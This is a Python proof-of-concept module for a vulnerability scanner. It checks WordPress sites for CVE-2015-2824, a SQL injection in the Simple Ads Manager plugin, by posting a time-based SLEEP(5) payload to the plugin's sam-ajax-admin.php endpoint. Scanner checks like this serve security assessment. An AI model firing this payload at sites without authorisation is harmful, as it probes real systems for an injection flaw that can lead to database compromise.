# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WordPress_0046' # 平台漏洞编号，留空
    name = 'WordPress Simple Ads Manager-Multiple 插件SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-02'  # 漏洞公布时间
    desc = '''
        WordPress Simple Ads Manager-Multiple 插件SQL注入
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36613/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'CVE-2015-2824' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Simple Ads Manager-Multiple'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a401b9ec-55a3-4822-965d-1aee897890ed'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = 'wp-content/plugins/simple-ads-manager/sam-ajax-admin.php' 
            url = arg + payload
            post_data1 = 'action=load_posts&cstr==1&sp=Post&spg=Page'
            post_data2 = 'action=load_posts&cstr==1%27)%20AND%20SLEEP(5)%20AND%20(%27WhYm%27=%27WhYm&sp=Post&spg=Page' 
            start_time1=time.time()

            req1 = requests.post(url, data=post_data1)
            end_time1 = time.time()
            _req2 = requests.post(url, data=post_data2)
            if (req1.status_code == 200 or _req2.status_code == 200) and ((time.time()-end_time1)-(end_time1-start_time1))>5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()